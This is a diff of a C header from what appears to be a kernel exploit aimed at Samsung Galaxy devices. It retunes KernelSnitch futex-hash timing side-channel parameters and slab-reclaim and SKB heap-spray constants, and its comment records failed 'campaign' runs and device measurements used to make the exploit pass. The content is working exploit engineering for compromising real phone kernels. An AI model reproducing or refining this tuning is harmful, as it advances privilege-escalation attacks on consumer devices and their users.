@@ -53,11 +53,26 @@
 #define SLIDE_SKB_SEND_SIZE 0x8e80
 #define SKB_RECLAIM_SENDS 16
 
-/* Controlled mm-group reclaim tuning (dm1q/gts9 shared set; mechanics only,
- * no UEDZE4-derived offsets). Required by APP_CONTROLLED_MM_GROUP_RECLAIM. */
+/* Controlled mm-group reclaim tuning. Geometry (scans/objects/skip/trigger/
+ * skb) stays on the dm1q/gts9 set; the KernelSnitch profile is UEDZE4-local.
+ * Campaign 33: the controlled search appended only 256 futexes, so every
+ * phase returned 0 collisions (campaign 32: attempts 1..18, all four phase
+ * summaries empty). Detection is a ratio test - a probe's wake time must beat
+ * KERNELSNITCH_THRESHOLD_MULT (15 here) times a bucket-0 baseline - and the
+ * ratio is set by the waiter chain length of the piled bucket, while the hit
+ * rate per probe is 1/hashsize regardless of the pile. Our device's own
+ * measurement (ksdiag) closed 3 collisions at collisions=4, appended=4096,
+ * repeat=64, average=8, hashsize=2048, so the controlled search reuses that
+ * exact profile instead of the 256-append one. Hint stays 2 because
+ * kernelsnitch_find_collisions asserts collisions >= 2 (wanted = 1); full
+ * drops to 4 because wanted = collisions-1 = 3 is what this device has been
+ * measured to produce, where the dm1q value of 5 demands 4 and cannot pass. */
 #define S918_PAGE_SCAN_MAX 256
 #define S918_KSNITCH_HINT_COLLISIONS 2
-#define S918_KSNITCH_FULL_COLLISIONS 5
+#define S918_KSNITCH_FULL_COLLISIONS 4
+#define S918_KSNITCH_APPENDED_FUTEXES 4096
+#define S918_KSNITCH_REPEAT_MEASUREMENT 64
+#define S918_KSNITCH_AVERAGE 8
 #define S918_DMA32_SKIP_SLABS 8
 #define S918_TRIGGER_SLABS 24
 #define S918_SKB_SENDS 256
